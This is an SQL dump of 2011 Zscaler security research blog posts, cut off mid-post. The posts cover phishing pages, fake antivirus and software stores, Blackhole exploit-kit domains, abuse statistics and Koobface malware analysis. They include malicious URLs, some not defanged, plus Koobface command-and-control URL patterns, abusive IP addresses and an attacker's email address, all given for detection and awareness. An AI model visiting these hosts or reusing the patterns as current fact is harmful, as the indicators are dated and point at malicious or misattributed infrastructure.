INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (343, 'Analyzing Malicious Files For Writing Network Signatures', 'ThreatLabz', 'November 10, 2011', 'Attackers continually modify malware in order to evade antivirus software. Attackers will pack or encrypt malicious files using various packers. Blocking each and every malicious executable is a challenging task for antivirus vendors. Most malicious files, once installed, try to download additional malware or send HTTP GET/POST requests to malicious servers controlled by attackers. Malicious files can gather sensitive information and then send it to the controlled servers. Given the networking capabilities of malware, beyond simply trying to identify the malicious binary itself, we can also detect malware by identifying certain patterns in network traffic. This blog will explain how someone with limited reverse engineering skills can monitor network traffic to identify malicious binaries.      For this tutorial, we will use the example of a real-world malicious server - “hxxp://uaetoon.net/scan/”. This website hosted a fake antivirus program, designed to convince a victim that their PC was infected. The site displayed different security alerts, such as “Your Computer is Infected”. Here is the screenshot of the malicious website once visited,    The website would then convince the victim to download a malicious binary file called “setup.exe” in order to remove fake threats found on the system. Installing the binary was of course actually installing a Trojan on the machine as opposed to an AV solution. The malicious binary would then send various HTTP requests to malicious servers controlled by the attackers. We can study the network traffic by allowing the binary to execute in a virtual machine, but this approach has some limitations:      	You need a separate controlled environment to run the malicious samples. It is never advisable to run the samples on your production network.  	There are chances that not all HTTP requests are fired by the malicious binary depending upon the availability of malicious severs.    Due to the above limitations, we sometimes need to first reverse the malicious binary in order to retrieve strings such as the destination servers. This can easily be done, with limited reverse engineering knowledge and without running the sample. Let’s begin with some static analysis. Download the malicious file on your machine or VMware image, but don’t run it.    Let’s first find out if the file has been packed using some well-known packer. To do so, you will need to open the malicious file in a hex or text editor. Here is the screenshot of file when opened in a text editor:  Here, a little knowledge of commonly used packers will be helpful. UPX (Ultimate Packer for Executables) is often used by attackers, as it is a free and open source packer. You will generally find strings like “UPX” and “UPX1” in the malicious file in plain text if the file is packed using UPX. Now that we know the file has been packed by UPX, we need to unpack it and open it in the IDA pro dissembler. To unpack the malicious file, download UPX packer. Unzip the packer and copy the malicious file into the UPX folder. Unpack the malicious file with the simple command shown in below screenshot,  Now, the file has been unpacked and can be opened in IDA pro. We are not going to fully reverse engineer the file for the purpose of this blog, rather we’ll look for potential domains where traffic is sent. In the next screenshot, you can see the binary in IDA Pro:    Allow IDA Pro to complete its analysis and then open the “Strings window” to identify strings used by the file. Going through the strings window, you will learn a great deal about the activities conducted by this binary, such as registry changes or network traffic sent. Let’s look at some interesting strings:  From the above strings, we can conclude that this malicious binary creates registry entries under “Run” in order to run this executable each time the computer is rebooted. This binary can also send HTTP POST requests with content type x-www-form-urlencoded, which refers to the URL format. This is valuable information when writing pattern matching signatures, in order to block further infection. Copy and save the URL format which is “http://%s%s?act%sor&v=1&a=%d&id=%s&hardid=%s”. The malicious file later will substitute domain strings and other data in place of the %s (string) variables.    Here is another set of strings:    We now have all the malicious domains, along with another URL pattern. That’s it! We now have all the domains and URL patterns necessary to write network-based signatures. While this approach won’t work in every case, it does represent an efficient way to write network signatures without the need to conduct a full and time consuming reverse engineering exercise. Now we have 2 URL patterns:      	http://%s%s?act%sor&v=1&a=%d&id=%s&hardid=%s  	%s?action=%sgen&v=%s    We can now easily block all HTTP requests, including the above patterns. Even if the attacker changes the domains used, chances are high that the URL format will remain the same. It turns out that this traffic relates to the now well-known Koobface worm.    Blocking all variants of malware can be difficult but we can greatly improve detection rates by additionally monitoring network traffic.    Hope this will be useful.  Umesh', 'Malware', 'https://www.zscaler.com/blogs/research/analyzing-malicious-files-writing-network-signatures');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (344, 'Siam Commercial Bank Phish In The Wild', 'ThreatLabz', 'October 30, 2011', 'Targeted Phishing attacks for banking and financial domains are a popular way for attackers to steal sensitive data from customers. To counter these attacks, banks and other financial institutions are driving various campaigns to educate their customers. Recently, I found a live phishing page for the “Siam Commercial Bank” of Thailand.    Naturally, a key ingredient in any phishing attack involves creating a nearly identical site that will convince the user that they’re at a legitimate site. Let’s take look at the phishing page for SCB:        You can observe areas marked in the picture above, which differentiate it from the legitimate SCB website. When a victim enters a username and password, the phishing webpage sends these credentials to a webserver controlled by the attacker.    Let’s enter fake credentials and see how these are sent to the cyber-criminals.             Legitimate sites use SSL encryption to secure sensitive information entered by the users, while this phishing site sends the data in clear text, presumably because the attackers were too cheap to pay for a signed SSL certificate.    Lets take a look at the legitimate webpage of SCB and observe the same marked areas:        We have observed numerous similar phishing pages. Recently, Umesh blogged about a phishing scam targeting Gmail users. It’s always a good idea to directly surf to a page before entering sensitive information, rather than clicking on a link that may take you to a fake site. I hope our blogs helps you to identify common red flags that reveal phishing pages.    Beware SCB Customers!    Pradeep', 'Phishing', 'https://www.zscaler.com/blogs/research/siam-commercial-bank-phish-wild');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (345, 'Now “ce.ms” Free Domains Are Being Used To Host Malicious Code', 'ThreatLabz', 'October 27, 2011', 'A few months back, I posted a blog on “co.tv” domains being used by attackers to host malicious code . We had identified number of different domains being used to carry out attacks using heavily obfuscated JavaScript. Now it appears that attackers are leveraging free “.ce.ms” domains. Likewise, we have identified a number of .ce.ms domains exploiting various known client side vulnerabilities. Here are a few of the URL’s being used:\r\n \r\n\r\nhxxp://27glshegbslijels.ce.ms/main.php?page=66c6ce3c7bc4b20c\r\nhxxp://hhhjjjjj111111.ce.ms/main.php?page=423b262d0a1a9f70\r\nhxxp://00000000000000.ce.ms/main.php?page=423b262d0a1a9f70\r\nhxxp://24sjegohmjosee.ce.ms/main.php?page=66c6ce3c7bc4b20c\r\nhxxp://44444444444444444.ce.ms/main.php?page=423b262d0a1a9f70\r\n\r\nThe aforementioned domains suggest that random domain names are being registered to host these attacks. Once visited, the victim will be presented with obfuscated JavaScript code, formatted in such way to evade IDS, IPS and antivirus solutions. The numbers in the arrays used by the scripts are intentionally spread across separate lines. This way the size of HTML file becomes huge and the total code spans 29K lines. Here is the snapshot of the first part of the malicious code:\r\n\r\nLook at the array variable. As can be seen, the numbers used in the array are spread over separate lines. Here is the last part of the script:\r\n\r\n\r\n\r\n\r\n \r\n\r\nOnce the above code is decoded, it turns out be related to the Blackhole exploit kit which exploits a variety of known client side vulnerabilities. Here is a small screenshot of the decoded script:\r\n\r\n \r\n\r\nAttackers keep registering different random domains to spread their attacks, often targeting free registration services. Due to obfuscation used by the attackers, security solutions relying on regular expressions designed to match known patterns can often be evaded due to the code being spread of over numerous lines.\r\n \r\n\r\nStay safe!!!\r\nUmesh', 'Malware', 'https://www.zscaler.com/blogs/research/now-cems-free-domains-are-being-used-host-malicious-code');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (346, 'IPAbuseCheck Stats', 'ThreatLabz', 'October 26, 2011', 'Last week, we announced our IPAbuseCheck lookup tool. We see lots of infected/abusive hosts on the Internet attempting to proxy abusive web transactions through our proxies. Rather than just ignoring these transactions, we’ve decided to provide this lookup utility for security professionals and organizations to query and identify abusive/infected hosts within their networks – based on some feedback, the service has been well received. This follow-up post provides a brief summary of the top offenders that we see in our database to date (July 1 – October 25, 2011).         Top Abuse Breakdown by Geography    The top 15 countries account for over 75% of the abusive clients that we have seen- with the US, China, Russia, Germany, Venezuela, and India accounting for half of the abusive clients that we have seen to date.          Top Abuse Breakdown by Organization (ASN)         	  		  			ASN by Abusive Clients  			ASN by Abusive Transactions  		  		  			  			  				  					  						ASN  						% of Clients  					  					  						AS4812 China Telecom  						6.32%  					  					  						AS4134 Chinanet  						5.16%  					  					  						AS8048 Servicios, Venezuela  						3.82%  					  					  						AS4837 CNCGROUP  						2.54%  					  					  					  					  						AS15857 Telefonia Dialog S.A.  						2.53%  					  				  			  			  			  			  				  					  						ASN  						% of Transactions  					  					  						AS14618 Amazon.com, Inc.  						25.16%  					  					  						AS8069 Microsoft Corp  						10.23%  					  					  						AS8075 Microsoft Corp  						9.92%  					  					  						AS4134 Chinanet  						5.02%  					  					  					  					  						AS28753 Leaseweb Germany  						4.28%  					  				  			  			  		  	          It was interesting to see some well known organizations like Amazon and Microsoft near the top for organizations that have sent us the most abusive transactions. Rather than these being infected corporate systems, it appears to be a handful of hosting service systems that are being abused either directly from the customer or from an infection. Here is a snapshot of a report from our database of a Microsoft IP that we reported to their Abuse Dept. once we started digging into this data:         70.37.48.163  OriginAS: AS8075  NetName: MICROSOFT-DYNAMIC-HOSTING          Screenshot of 70.37.48.163 Abuse Report           The transactions observed were hundreds of thousands of brute-force attempts against file sharing sites like Megaupload, Hotfile, Filesonic, and Rapidshare.         Top Abuse Breakdown by Client    Clients in our database that have the longest time range of abuse seen tend to be those clients that are scanning the Internet looking for open web proxies. These were the top 5 clients that we have seen with the longest date range from:      Top 5 Abusive Hosts by Date Range      	  		  			Host  			First Seen  			Last Seen  			Behavior  		  		  			193.17.253.7  			07/01/11 07:00  			10/25/11 06:54  			Proxy Scanning  		  		  			207.226.163.146  			07/01/11 07:00  			10/25/11 06:51  			Proxy Scanning  		  		  			174.34.168.114  			07/01/11 07:06  			10/25/11 06:57  			Proxy Scanning  		  		  			221.187.4.28  			07/01/11 07:07  			10/25/11 06:56  			Proxy Scanning  		  		  			69.164.211.212  			07/01/11 07:08  			10/25/11 06:54  			Proxy Scanning  		  	             The following table lists the top 5 abusive hosts by transaction count - these tend to be hosts that attempt to forward bulk transactions through proxies, like forum spam and brute-force attempts. Related to the previous section of organizations with the top abusive transactions - you can see that two Amazon EC2 systems (75.101.225.168, 248) are at the top of the list.      Top 5 Abusive Hosts by Transactions      	  		  			Host  			Transaction %  			Behavior  		  		  			75.101.225.168  			19.94%  			Forum Spam  		  		  			111.221.81.70  			6.31%  			Forum Spam  		  		  			75.101.225.248  			5.17%  			Forum Spam  		  		  			117.41.235.133  			3.06%  			Brute-Forcing  		  		  			84.16.224.62  			2.13%  			Brute-Forcing  		  	        Top Web Services Targeted in Abuse    The following lists the top 5 most targeted web sites/services abused by number of transactions and number of unique abusing clients.         Top 5 Abused Web Services by:        	  		  			  			Abusive Transactions:    			  			  				forum.zing.vn  				dbol.vn/forum/  				forum.sonlaol.vn  				api.rapidshare.com  				vdrz.vn/f/  			  			  			  			  			Abusive Clients:    			  			  				chek.zennolab.com  				login.sina.com.cn  				clickingagent.com  				p24.easybitsgo.net  				checker.samair.ru  			  			  			  		  	        The bulk of the top sites by transaction are forum spam sites - in the top instances, the forums being abused are in Vietnam. One brute-forcing target is in the top 5, which is the Rapidshare file host. The bulk of the top services being used/abused by number of clients are proxy checkers - the Chinese service sina.com.cn was also listed in the top as a spam bot / brute-forcing target.         The above post provides some insight into the types of information that can be extracted from this service, and we\'ll continue to update the database regularly with the latest abusing clients.', 'Analysis', 'https://www.zscaler.com/blogs/research/ipabusecheck-stats');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (347, 'Naked Emma Watson Video Used To Spread Malware', 'Julien Sobrier', 'October 26, 2011', 'Fake videos with funny or sexual content, have long been used to entice users to download and install malware. The technique is used by hackers to convince users that they need to install additional codecs, or software, in order to play the video.I\'ve found several websites redirecting to \"Emma Watson never seen before home video\" hosted on various rr.nu domains: strongrzholder.rr.nu, smartutnetwork.rr.nu, etc. The page looks very similar to a YouTube page, with related videos on the left, and fake comments below the player.Emma Watson never seen before home videoA click on the Play button, or any link on the page, shows a warning that the Flash player is out of date and a new version needs to be installed in order to play the video.Warning about outdated Flash versionThe warning is very well designed. It feels like a desktop software with an animated download function, despite being part of the web page. The user is enticed into downloading and installing a file called scandsk.exe.Malicious executableOnce again, the malicious executable has a very low detection rate amongst AV vendors: only 7 out of 42 detect the threat.Virustotal reportBe aware of any update done outside of official vendor websites.-- Julien', 'Malware;AntiVirus', 'https://www.zscaler.com/blogs/research/naked-emma-watson-video-used-spread-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (348, 'IPAbuseCheck: Clients Abusing Web Proxies', 'ThreatLabz', 'October 19, 2011', 'IPAbuseCheck was designed to provide a simple, free web interface to query your IP addresses against a database that we have built containing unauthenticated IP addresses that have attempted to forward abusive or unwanted traffic through one or more of our proxies. The database contains abusive IPs identified from July to present, and contains well over 20K unique IP addresses. Here is a screenshot showing an example report of an IP listed in our DB:    In this case, a client IP at a very large software company is infected and attempted to issue tens of thousands of login POST requests through our proxies to Megaupload servers (and others such as Rapidshare, Hotfiles, and Yahoo webmail) using the \"Googlebot\" user-agent. Note: URL parameter values have been stripped from the URLs in our database. This particular client IP is not listed in any IP blacklists (checked using rbls.org). Very often IP blacklists list client IP addresses visible from the server perspective - in this case, it would have been our proxy IP if we let these transactions through. Our database provides a bit of a different perspective from many of these existing blacklists, in that we are listing abusive clients that are using proxies.    The goal of this free service is to provide those interested (ISPs, companies/organizations, security professionals, etc.) with this data to identify and clean-up clients that are participating in this form of abuse. Clients leverage proxies to distribute and/or mask their origin when conducting forms of abuse, such as:             	Brute-force web-based logins  	Search Engine Optimization (SEO)  	Forum spamming  	Pay-per action cheating  	Open proxy scanning  	Bulk account registration  	Site popularity / voting inflation  	other forms of abuse (DDoS and web-site scraping)    Client IPs listed include both those that are intentionally used for abuse and those that are from infected hosts that are unknowingly abusing proxies on the Internet. Zscaler\'s service provides policy and security enforcement through its proxies from its customers - valid customers must first authenticate to the Zscaler service before being able to use our proxies. Transactions listed in this database are from unauthenticated clients attempting to utilize our proxies in an open manner to distribute and mask traffic for their abuse.    The idea for this service stemmed from two Zscaler blog posts:             	Top Abuses of Open Web Proxies  	Brute-Forcing Client using \"Googlebot\" UA    We attempted to remove anything that we deemed to be a false-positive of abuse, but since this listing based on a few things like regular expressions and behavioral patterns it is still possible that the database contains false-positives. Use this information at your own discretion.', 'Analysis', 'https://www.zscaler.com/blogs/research/ipabusecheck-clients-abusing-web-proxies');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (349, 'Fake Free AVG Download Sites', 'Julien Sobrier', 'October 19, 2011', 'Fake antivirus sites are a very common way to trick people into installing malware on their computers. Another technique is to repackage popular software with adware or malware, and offer them for download.AVG is a popular Antivirus vendor that offers a free version of it\'s product at http://free.avg.com/. Rather than getting money by bundling this free spammer with pay-per-install adware, scammers have created websites to sell (free) AVG! hxxp://www.avg-free-download.org/ http://www.avg-free.us/hxxp://free-avg-download.com/http://free.avg.com/ (Official)The three fake sites redirect the users to a payment form. The first page gathers names and e-mail addresses. Even if the user decides not to pay, the scammer can still spam the user, or resell their e-mail address. This is no small profit!hxxps://secure.signup-processor.com/Then, the user is required to pay for the software. The payment is actually not for AVG itself, but for a monthly maintenance fee:Monthly \"maintenance\" feeThe real Free AVG antivirus product is completely free of course, including access to the antivirus definition file updates.A search for \"free avg\" shows a lot of other spam sites, most of which are fortunately harmless.As always, users should make sure they download their software from the official site. AVG flagged these three sites, but Google Safe Browsing and Internet Explorer did not. Of course, people looking for Free AVG clearly don\'t have AVG installed yet.-- Julien', 'AntiVirus', 'https://www.zscaler.com/blogs/research/fake-free-avg-download-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (350, 'Beware Of Fake Websites Stealing Credit Card Information', 'ThreatLabz', 'October 18, 2011', 'People often uses credit cards online to purchase products but many people fail to validate the site address and proceed with submitting sensitive information such as card numbers. Attackers can then steal credit card information along with the associated CVV number. Here is an example of one such fake website, hosting supposedly ‘free’ services - hxxp://www.angelfire.com/ak5/billincenta/.      Once a victim visits this website, he will be presented with popup box portraying the site as AOL’s billing center:  The message indicates that the user needs to update credit card and billing information, or their account will be ‘voided and cancelled’. When victim clicks on the OK button, he will be taken to another webpage where he is asked to enter his credit card details.  Once the victim enters their sensitive and personal information, the webpage smartly displays another popup stating “AOLBilling will now validate your credit card”. This is again done to convince user that the site is a legitimate AOL billing website. Nothing is actually validated against AOL and credit card information is sent to attacker. The webpage collects and sends a POST request with all user details. Here is packet capture of the request sent:    For the purpose of this blog, we have entered fake information. If you look at the above POST request, you will also notice a recipient email address of “maximatm@yahoo.com”. This means all sensitive information is sent to this email address. The victim is then redirected to the error page.    Users should never enter credit card details without being 100% confident that the form is hosted at the correct domain and traffic is sent via HTTPS.    Umesh', 'Scam', 'https://www.zscaler.com/blogs/research/beware-fake-websites-stealing-credit-card-information');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (351, '\"1.php\" Group Intrusion Set Paper', 'ThreatLabz', 'October 12, 2011', 'Update: report links now go straight to the paper versus the general Whitepaper page.ThreatLabZ has just released a report that provides a summary of incident information related to the \"1.php\" Group.   Historically, this Group used command and control servers (C&Cs) with \"/1.php?\" for the checkin URL path - which is the reason for the informal name used.  They have repeatedly targeted one of our customers - so I worked to compile some research on this group.  There is evidence to show that the group has been operating at least since 2008 and that they tend to target China/US relations experts, Defense entities, and Geospatial entities using spear phishing with a malicious PDF attachment or a link to a ZIP that decompresses a malicious SCR.  The payload is often a PoisonIvy remote access tool/trojan (RAT) or something similar.  They have varied their C&C checkin behavior, but it is usually over the web - sometimes it is HTTPS, sometimes it is HTTP with different checkin parameters/paths.  The Group either registers their own domains or uses No-IP dynamic DNS domains for their C&Cs.For further details on the \"1.php\" Group research, please register and view the report HERE.One challenge with doing this research is who/how to share the information. Responsible disclosure is pretty well defined at this point for vulnerability information, but it is not in terms of incident response information (particularly when the \"APT\" term is used).  This report provides high-level indicators of compromise (such as general network behavior and malicious domains) without the release of specifics, such as victim information.  The purpose is to establish a community of awareness so that organizations can better detect and protect against these and similar threats.  Additional specifics of the attacks were limited to stakeholders (victims and those chartered with protecting them).If you have additional details on this Group or would like to exchange information with Zscaler - please contact us at our threatlabz email address.', 'APT;Malware', 'https://www.zscaler.com/blogs/research/1php-group-intrusion-set-paper');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (352, 'Building Zscaler Likejacking Prevention For Different Browsers', 'Julien Sobrier', 'October 06, 2011', 'Facebook Likejacking Prevention is the second plug-in that I\'ve released for multiple browsers (Google Chrome, Safari and Firefox). It is technically much more complex than the previous one, Zscaler Safe Shopping.    Each browser offered different challenges. As promised in the previous blog post, I will provide details of what was required to port the plugin to different platforms.    Facebook Likejacking Prevention 1.0.8    Before I start on the technical details, I\'d like to remind all users to upgrade to the latest version of the add-on (currently 1.0.8). In Firefox and Chrome, go to Add-ons or Extensions, and check for updates. For Safari users, please install the latest version from our website. I have fixed a couple of bugs, and made several improvements in the detection of suspicious pages.    This is a fairly long and technical post. Don\'t hesitate to post a comment if some points are not clear.    The Architecture    There are two main components in the plugin. The first feature involves finding  the Facebook widgets inside a page. These widgets are iframes hosted on www.facebook.com. Then the plugin needs to inspect the containers, the HTML elements that contain the IFRAME, to figure out if the widget is hidden or not. The protection (widget removal or explicit confirmation) needs to be applied on each widget, as chosen by the user.    The second element involves displaying relevant information to the user: a quick view indicating whether the page is suspicious or not and a more detailed view for additional information.    Google Chrome    Extensions on Google Chrome are comprised of two parts:    	A background page which has access to the browser: local storage, extension options, tab events, etc., but it does not have access to the content of the tabs, i.e the HTML content  	A content script injected in each page/frame/iframe, which has access to the HTML content (read and write), but does not have access to the browser or other tabs. The content script injected in one frame does not have access to other frames or iframes, even within the same tab.    The background page and the content scripts can communicate with each other by sending messages.    In Zscaler Likejacking Prevention, the content scripts are charged with finding the Facebook widgets, inspecting the containers, and sending the information back to the background page. The background page aggregates  the information for each tab, and decides which action to take on the tab content depending upon the options and whether or not suspicious elements where found.    This architecture works well for the add-on, except in these two scenarios:    Layers of Frames/Iframes    Facebook widgets can be loaded inside an iframe or a frame, which can itself be loaded inside an iframe, etc. In order to inspect the container, the content script would have to cross the boundaries of the frame/iframe it was injected in. But this is not allowed by the browser. So doing the DOM inspection for the container from bottom (the Facebook widget) to top (the main document) by each injected script is not possible.    Instead, container inspection has to be done with a mix of bottom up and top down. The content script in the main document does have read access to all the frames/iframes which it resides in. After all Facebook iframes are found, the container inspection is done from the widget to its containing iframe (bottom up).    The parent container is found with the parentNode property of a DOM element in Javascript. Unfortunately, the parentNode of an iframe is shown as null.  In order to find the container of an iframe, it has to be found from the top document down to the iframe based on it\'s SRC attribute. Finally, a new score is computed by the main document and sent back to the background page. If an action needs to be taken, the background page sends a message to all injected scripts inside the tabs.    Late loading    The page is inspected as soon as it is loaded, in order to apply the protection quickly. However, Facebook widgets can be inserted at any time, including after a page has finished loading. So the page score must be recalculated every time a new iframe is loaded.    To solve the problem, when the background page gets a message from an injected script inside a Facebook iframe, it checks if any Facebook widgets were already found in this tab. If not, the background page asks for a new evaluation of the page.    Icon and Popup    Chrome has the best architecture for showing information for a specific page. It was very easy to show an icon associated with a popup for a given tab. No problem there.    Safari    Safari (Opera and Firefox Mobile as well)  has the same plug-in architecture as Google Chrome, with the separation between the background page (referred as global page by Safari) and content script. Therefore, it did offer the same challenges as Chrome.    However, some technical limitations in Safari did bring a few more issues...    One way communication    While each injected script can send a message to the global page, the global page can only send a message to the main page, not to each frame/iframe. To be more specific, the global page can reply back to a message from a frame/iframe, but cannot initiate the message to them. That means once it has aggregated the information from all content scripts, it can push a message to apply the protection to the main page only. To get around this limitation, each frame/iframe has to send a message to the global page regularly to check if there is any action to be taken.    Storing the aggregate information    In Chrome, each tab has a unique ID. The aggregate information is associated with the tab ID. There is no such ID in Safari. Instead, the information can be saved as a property of the tab. Unfortunately, if the tab is moved to a new window by the user, the associated property is reset, and the information is lost. I have to save the information as a tab property (the most accurate way), but also based on the URL in case the tab is moved. If there are different tabs with the same URL, but different content, the data can be mixed up.    Limited UI    I had to find a creative way to get around the UI limitations of Safari. First of all, it is not possible to have an icon in the URL bar as I do in Chrome and Firefox. Then, toolbar buttons are black and white only, and can have only 2 states. I need 3 states for the button: no Facebook widgets on the page, safe page with Facebook widgets and suspicious page.    Instead of an icon or button, I had to use a toolbar. I also had to take care when it came to hiding and showing the toolbar when the user switched tabs, loaded a new URL, etc.    I actually had to use two toolbars, because each is limited to a fixed height of 30 pixels. One toolbar is not enough for all the information and links I want to show. The detailed information and actions have to be shown on a second toolbar!    Firefox    Firefox has a centralized plugin architecture: the browser and all the tabs, including their content with read and write permissions are available from the same JavaScript file. That made it much easier to inspect DOM elements with several layers of frames/iframes.    However, it was harder to detect new frames/iframes being loaded or added by just listening to page load events. The solution I use is to listen to HTTP requests for HTML documents and re-inspect the tab every time a new element was sent.    UI    The UI was a bit more tricky than in Google Chrome. There are icons associated with a popup called Page action. Unfortunately, the popup content is limited to a piece of text and one button. This does not work with the information and actions I needed to offer.    Instead, I had to create my own \"Page Action\" by adding and removing an icon in the URL bar as needed and showing a toolbar at the top of the tab when the user clicks on the icon for more information. Overall, it required a bit more work than Google Chrome, but was much easier than for Safari    Conclusion    It was interesting to see the impact of the different browser architectures and limitations on my plugin. Safari was by far the hardest platform to work with. DOM inspection and manipulation was the easiest in Firefox, while displaying information in the UI was best done in Google Chrome.    It is a bit disappointing that it was not possible to have the plugin look the same in the different browsers. Google has the layout I really wanted and I found the UI restrictions in Safari very problematic.    -- Julien', 'Tools', 'https://www.zscaler.com/blogs/research/building-zscaler-likejacking-prevention-different-browsers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (353, 'Protect Your Self Against Facebook Spam: Zscaler Tool For \"LikeJacking\" Protection', 'Julien Sobrier', 'September 26, 2011', 'Facebook widgets, including the \"Like\" buttons, are often used to spread spam and propagate scams. Typically, the scammer creates a page with a fake video player. Users are tricked into clicking on Facebook Like buttons hidden behind a fake Play button. This is called Likejacking, and it\'s a specific form of clickjacking. I have posted a Youtube video showing in June that explains how these Facebook widgets are disguised.    I previously posted a bookmarket - a piece of JavaScript that can be executed on any page to display hidden Facebook widgets on the page. I wanted to go a step further and offer good protection against Likejacking, or any type of clickjacking with Facebook widgets (Facebook comments, Facebook login, etc.).    You can install the free Zscaler Likejacking Prevention tool for Firefox, Google Chrome and Safari. The extension offer 2 primary features:    	Information about the page: does it contain Facebook widgets? Are these widgets hidden?  	Protection against hidden widgets: the application requires explicit confirmation from the user when clicking on a Facebook widgets on a suspicious page             Page information    On Firefox and Chrome, an icon is displayed in the URL bar when a page contains at least one Facebook widget. If the page is suspicious, meaning hidden widgets were detected, the icon has a red background. You can use https://www.zscaler.com/research/plugins/likejacking/example.htm as an example of a suspicious page.       	  		  			  		  		  			Suspicious page found in Firefox  		  	    If the page is safe, meaning the widgets are not hidden, the icon background is green. This allows users to have a quick understanding of the safety of the page.       	  		  			  		  		  			Safe page found in Chrome  		  	    Safari has the same functionality, but uses a toolbar instead of an icon.       	  		  			  		  		  			Suspicious page found in Safari  		  	      You can obtain more information on the page -- either by clicking on the icon, or \"More options\" in Safari -- including:    	how many widgets were found on the page  	whether the page is suspicious or not  	what protection was applied on the Facebook widgets           	  		  			  		  		  			Information, and actions, for a page with Facebook widgets (Chrome)  		  	    The popup (Chrome), or toolbar (Safari and Firefox) also let users take some action on the page: they can whitelist the current domain (see more below), manage their preferences, or display the hidden Facebook widgets on the page.    You can also report back to Zscaler, any page that was classified improperly by clicking on \"Report an error\". This will open a new tab in your browser and  send you to a form on the zscaler.com website. We will use this information to improve the add-on.    Display hidden widgets    As you can see in the Youtube video, it is possible to expose the hidden widgets. The extension can modify the source of the page (opacity, height, weight, z-index, overflow, etc.). You can try this feature on https://www.zscaler.com/research/plugins/likejacking/example.htm.       	  		  			  		  		  			Hidden Like buttons exposed in Firefox  		  	    Explicit confirmation    You can choose your level of protection in the preferences:    	Delete all Facebook widgets - Choose this option if you never use \"Like\" buttons on external sites. You can always whitelist a domain to keep the widgets on a particular site.  	Always ask for explicit confirmation - A popup will warn you that you clicked on an element that is trying to post to your public profile. You can decide to stop the action, or to let the page post to your profile. This is a good option if your rarely click on \"Like\" buttons.  	Ask for explicit confirmation only on suspicious pages with hidden widgets - This is a good balance between security and productivity. It is the recommended setting.        	  		  			  		  		  			Explicit confirmation in Safari  		  	    You can also whitelist domains so that no protections are applied on a given site. The popup, or toolbar, can show you what action was taken on a page -- for example confirm, remove, or ignore (no protection applied).       	  		  			  		  		  			Extension preferences in Chrome  		  	      Some notes    The extension does not affect the ability to use the main Facebook site; it protects users only on other sites that use widgets from Facebook.    Some Facebook widgets are hidden by design. This is normal, and the the extension will not list them as suspicious and will not apply any protection on those.    I will post another blog on the process of creating the plugin for different browsers to explain the challenges I faced on each platform.    -- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/protect-your-self-against-facebook-spam-zscaler-tool-likejacking-protection');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (354, 'Fake Software Store Imitate Groupon', 'Julien Sobrier', 'September 21, 2011', 'Fake software stores often claim to offer huge discounts, not unlike the well-known site Groupon. So it should not be a surprise that some of these fake stores look exactly like Groupon in an effort to be more familiar to the users and increase the likelihood of being trusted. One of these fake stores is axisoftware.com.Here are screenshots of Groupon and identical looking pages on axisoftware.com.Groupon: select a cityaxisoftware.com: home page (top)Groupon: daily dealaxisoftware.com: home page (center)The fake site does not work very well. Clicking on the Buy button on the home page didn\'t actually do anything. I had to first click on the \"deal\" and then the \"buy\" button before reaching the shopping cart.axisoftware.com:checkoutAfter entering my e-mail address, I was redirected to a payment website at lpstore.ws. Payment by VISA card then redirects to feriensoft.com. Mastercard is handled by screensavera.com.Fake payment siteLately, there has been a lot more activity around fake stores than around Fake AV, which used to me the most dominant threat in the Blackhat SEO world. There are currently thousands of spam websites redirecting to this particular fake Groupon store appearing in search engine results.-- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/fake-software-store-imitate-groupon');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (355, 'Thousands/Millions Of .tk Sites Created For Fake Online Stores', 'Julien Sobrier', 'September 15, 2011', 'While I was monitoring hijacked sites leading to fake online stores, I noticed a significant increase in .tk sites redirecting to searchdiscovered.com via domain.dot.tk. There are a number of interesting things going on with these .tk sites. First, the spammers have decided to create their own sites rather than hijacking existing sites with good reputation rankings. Doing a Google search, I found thousands of these sites: fidymarch.tk, isaftaho.tk, isaftaho.tk, jedkyosculit.tk, flicreuci.tk, meicatec.tk, etc. There may be up to 6 million sites like this.  Most of the domains are registered by two entities: DOT TK and Malo Ni Advertising Limited (Isle of Man).\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			WHOIS information for isaftaho.tk\r\n		\r\n	\r\n\r\n\r\nhttp://dot.tk/ offers free .tk domains and redirections, like co.cc, so it is is not surprising to see this service being abused.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Free .tk domain names\r\n		\r\n	\r\n\r\n\r\nThese .tk sites contain only spam, unlike hijacked sites, which contain both legitimate content and spam. They look all pretty much the same. The previous spam pages I saw were using only text, with no images. These sites look more like online stores, with images, and links to the actual fake stores\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Spam page from cetescawin.tk\r\n		\r\n	\r\n\r\n\r\nThe fake online stores linked from these spam sites are the same as the fake stores that I saw earlier: same template, same translations into 5 languages, same discounts, etc: cheapoem.com.ua, discountsoftware.com.ua, etc.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fake store discountsoftware.com.ua\r\n		\r\n	\r\n\r\nDown .... but still there\r\n\r\nAbout half of the .tk domains I\'ve tried seem to be down. They redirect to domain.dot.tk, then to searchdiscovered.com which seems to be a parking domain.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Domain parked on searchdiscovered.com\r\n		\r\n	\r\n\r\nIt is very likely that the .tk 